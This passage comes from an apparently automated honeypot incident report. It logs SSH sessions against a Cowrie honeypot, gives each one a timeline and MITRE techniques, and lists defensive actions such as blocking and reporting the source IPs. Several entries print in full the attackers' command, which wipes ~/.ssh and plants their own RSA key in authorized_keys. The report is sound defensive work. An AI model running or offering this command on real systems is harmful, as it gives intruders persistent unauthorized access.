| `2026-06-04 06:50:56` | `cowrie.client.version` |
| `2026-06-04 06:50:56` | `cowrie.client.kex` |
| `2026-06-04 06:50:57` | `cowrie.login.success` |
| `2026-06-04 06:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a88dbc8cf3

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:51 |
| **Last Seen** | 2026-06-04 06:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:51:17` | `cowrie.session.connect` |
| `2026-06-04 06:51:17` | `cowrie.client.version` |
| `2026-06-04 06:51:17` | `cowrie.client.kex` |
| `2026-06-04 06:51:18` | `cowrie.login.success` |
| `2026-06-04 06:51:18` | `cowrie.session.params` |
| `2026-06-04 06:51:18` | `cowrie.command.input` |
| `2026-06-04 06:51:18` | `cowrie.command.failed` |
| `2026-06-04 06:51:18` | `cowrie.log.closed` |
| `2026-06-04 06:51:19` | `cowrie.session.params` |
| `2026-06-04 06:51:19` | `cowrie.command.input` |
| `2026-06-04 06:51:19` | `cowrie.session.file_download` |
| `2026-06-04 06:51:19` | `cowrie.log.closed` |
| `2026-06-04 06:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6dc13ed1d35

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:51 |
| **Last Seen** | 2026-06-04 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:51:21` | `cowrie.session.connect` |
| `2026-06-04 06:51:21` | `cowrie.client.version` |
| `2026-06-04 06:51:21` | `cowrie.client.kex` |
| `2026-06-04 06:51:22` | `cowrie.login.success` |
| `2026-06-04 06:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c776dbed1b3e

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 06:51 |
| **Last Seen** | 2026-06-04 06:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:51:53` | `cowrie.session.connect` |
| `2026-06-04 06:51:53` | `cowrie.client.version` |
| `2026-06-04 06:51:54` | `cowrie.client.kex` |
| `2026-06-04 06:51:54` | `cowrie.login.success` |
| `2026-06-04 06:51:54` | `cowrie.session.params` |
| `2026-06-04 06:51:54` | `cowrie.command.input` |
| `2026-06-04 06:51:54` | `cowrie.command.failed` |
| `2026-06-04 06:51:55` | `cowrie.log.closed` |
| `2026-06-04 06:51:55` | `cowrie.session.params` |
| `2026-06-04 06:51:55` | `cowrie.command.input` |
| `2026-06-04 06:51:55` | `cowrie.session.file_download` |
| `2026-06-04 06:51:55` | `cowrie.log.closed` |
| `2026-06-04 06:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12b83001b6c

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 06:51 |
| **Last Seen** | 2026-06-04 06:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:51:57` | `cowrie.session.connect` |
| `2026-06-04 06:51:57` | `cowrie.client.version` |
| `2026-06-04 06:51:57` | `cowrie.client.kex` |
| `2026-06-04 06:51:58` | `cowrie.login.success` |
| `2026-06-04 06:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f99f7716dc2c

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:52 |
| **Last Seen** | 2026-06-04 06:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:52:33` | `cowrie.session.connect` |
| `2026-06-04 06:52:33` | `cowrie.client.version` |
| `2026-06-04 06:52:34` | `cowrie.client.kex` |
| `2026-06-04 06:52:34` | `cowrie.login.success` |
| `2026-06-04 06:52:35` | `cowrie.session.params` |
| `2026-06-04 06:52:35` | `cowrie.command.input` |
| `2026-06-04 06:52:35` | `cowrie.command.failed` |
| `2026-06-04 06:52:35` | `cowrie.log.closed` |
| `2026-06-04 06:52:35` | `cowrie.session.params` |
| `2026-06-04 06:52:35` | `cowrie.command.input` |
| `2026-06-04 06:52:35` | `cowrie.session.file_download` |
| `2026-06-04 06:52:35` | `cowrie.log.closed` |
| `2026-06-04 06:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9f5b1836b76

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:52 |
| **Last Seen** | 2026-06-04 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:52:38` | `cowrie.session.connect` |
| `2026-06-04 06:52:38` | `cowrie.client.version` |
| `2026-06-04 06:52:38` | `cowrie.client.kex` |
| `2026-06-04 06:52:39` | `cowrie.login.success` |
| `2026-06-04 06:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-791c6acd013b

| Field | Detail |
|---|---|
| **Source IP** | `193.36.84[.]162` |
| **First Seen** | 2026-06-04 06:54 |
| **Last Seen** | 2026-06-04 06:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:54:44` | `cowrie.session.connect` |
| `2026-06-04 06:54:44` | `cowrie.client.version` |
| `2026-06-04 06:54:44` | `cowrie.client.kex` |
| `2026-06-04 06:54:44` | `cowrie.login.success` |
| `2026-06-04 06:54:45` | `cowrie.session.params` |
| `2026-06-04 06:54:45` | `cowrie.command.input` |
| `2026-06-04 06:54:45` | `cowrie.command.failed` |
| `2026-06-04 06:54:45` | `cowrie.log.closed` |
| `2026-06-04 06:54:45` | `cowrie.session.params` |
| `2026-06-04 06:54:45` | `cowrie.command.input` |
| `2026-06-04 06:54:45` | `cowrie.session.file_download` |
| `2026-06-04 06:54:45` | `cowrie.log.closed` |
| `2026-06-04 06:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.36.84[.]162` to AbuseIPDB if not already reported
- [ ] Block `193.36.84[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8460bff50438

| Field | Detail |
|---|---|
| **Source IP** | `193.36.84[.]162` |
| **First Seen** | 2026-06-04 06:54 |
| **Last Seen** | 2026-06-04 06:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:54:54` | `cowrie.session.connect` |
| `2026-06-04 06:54:54` | `cowrie.client.version` |
| `2026-06-04 06:54:54` | `cowrie.client.kex` |
| `2026-06-04 06:54:55` | `cowrie.login.success` |
| `2026-06-04 06:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.36.84[.]162` to AbuseIPDB if not already reported
- [ ] Block `193.36.84[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f76d2a257de4

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 06:55 |
| **Last Seen** | 2026-06-04 06:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:55:54` | `cowrie.session.connect` |
| `2026-06-04 06:55:54` | `cowrie.client.version` |
| `2026-06-04 06:55:55` | `cowrie.client.kex` |
| `2026-06-04 06:55:55` | `cowrie.login.success` |
| `2026-06-04 06:55:55` | `cowrie.session.params` |
| `2026-06-04 06:55:55` | `cowrie.command.input` |
| `2026-06-04 06:55:55` | `cowrie.command.failed` |
| `2026-06-04 06:55:56` | `cowrie.log.closed` |
| `2026-06-04 06:55:56` | `cowrie.session.params` |
| `2026-06-04 06:55:56` | `cowrie.command.input` |
| `2026-06-04 06:55:56` | `cowrie.session.file_download` |
| `2026-06-04 06:55:56` | `cowrie.log.closed` |
| `2026-06-04 06:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96379784701

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 06:55 |
| **Last Seen** | 2026-06-04 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:55:58` | `cowrie.session.connect` |
| `2026-06-04 06:55:58` | `cowrie.client.version` |
| `2026-06-04 06:55:58` | `cowrie.client.kex` |
| `2026-06-04 06:55:59` | `cowrie.login.success` |
| `2026-06-04 06:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ae8c82c8c3e

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 06:57 |
| **Last Seen** | 2026-06-04 06:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:57:39` | `cowrie.session.connect` |
| `2026-06-04 06:57:39` | `cowrie.client.version` |
| `2026-06-04 06:57:39` | `cowrie.client.kex` |
| `2026-06-04 06:57:40` | `cowrie.login.success` |
| `2026-06-04 06:57:40` | `cowrie.session.params` |
| `2026-06-04 06:57:40` | `cowrie.command.input` |
| `2026-06-04 06:57:40` | `cowrie.command.failed` |
| `2026-06-04 06:57:40` | `cowrie.log.closed` |
| `2026-06-04 06:57:41` | `cowrie.session.params` |
| `2026-06-04 06:57:41` | `cowrie.command.input` |
| `2026-06-04 06:57:41` | `cowrie.session.file_download` |
| `2026-06-04 06:57:41` | `cowrie.log.closed` |
| `2026-06-04 06:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2686b52c7800

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 06:57 |
| **Last Seen** | 2026-06-04 06:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:57:43` | `cowrie.session.connect` |
| `2026-06-04 06:57:43` | `cowrie.client.version` |
| `2026-06-04 06:57:43` | `cowrie.client.kex` |
| `2026-06-04 06:57:43` | `cowrie.login.success` |
| `2026-06-04 06:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d45aa5c313

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 06:59 |
| **Last Seen** | 2026-06-04 06:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:59:50` | `cowrie.session.connect` |
| `2026-06-04 06:59:50` | `cowrie.client.version` |
| `2026-06-04 06:59:50` | `cowrie.client.kex` |
| `2026-06-04 06:59:51` | `cowrie.login.success` |
| `2026-06-04 06:59:51` | `cowrie.session.params` |
| `2026-06-04 06:59:51` | `cowrie.command.input` |
| `2026-06-04 06:59:51` | `cowrie.command.failed` |
| `2026-06-04 06:59:52` | `cowrie.log.closed` |
| `2026-06-04 06:59:52` | `cowrie.session.params` |
| `2026-06-04 06:59:52` | `cowrie.command.input` |
| `2026-06-04 06:59:52` | `cowrie.session.file_download` |
| `2026-06-04 06:59:52` | `cowrie.log.closed` |
| `2026-06-04 06:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bc9da515785

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 06:59 |
| **Last Seen** | 2026-06-04 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:59:54` | `cowrie.session.connect` |
| `2026-06-04 06:59:54` | `cowrie.client.version` |
| `2026-06-04 06:59:54` | `cowrie.client.kex` |
| `2026-06-04 06:59:54` | `cowrie.login.success` |
| `2026-06-04 06:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1995668c6d

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:07 |
| **Last Seen** | 2026-06-04 07:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:07:30` | `cowrie.session.connect` |
| `2026-06-04 07:07:30` | `cowrie.client.version` |
| `2026-06-04 07:07:30` | `cowrie.client.kex` |
| `2026-06-04 07:07:30` | `cowrie.login.success` |
| `2026-06-04 07:07:31` | `cowrie.session.params` |
| `2026-06-04 07:07:31` | `cowrie.command.input` |
| `2026-06-04 07:07:31` | `cowrie.command.failed` |
| `2026-06-04 07:07:31` | `cowrie.log.closed` |
| `2026-06-04 07:07:31` | `cowrie.session.params` |
| `2026-06-04 07:07:31` | `cowrie.command.input` |
| `2026-06-04 07:07:31` | `cowrie.session.file_download` |
| `2026-06-04 07:07:31` | `cowrie.log.closed` |
| `2026-06-04 07:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3acb93c0093

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:07 |
| **Last Seen** | 2026-06-04 07:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:07:33` | `cowrie.session.connect` |
| `2026-06-04 07:07:33` | `cowrie.client.version` |
| `2026-06-04 07:07:34` | `cowrie.client.kex` |
| `2026-06-04 07:07:34` | `cowrie.login.success` |
| `2026-06-04 07:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07187ad46e2f

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:09 |
| **Last Seen** | 2026-06-04 07:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
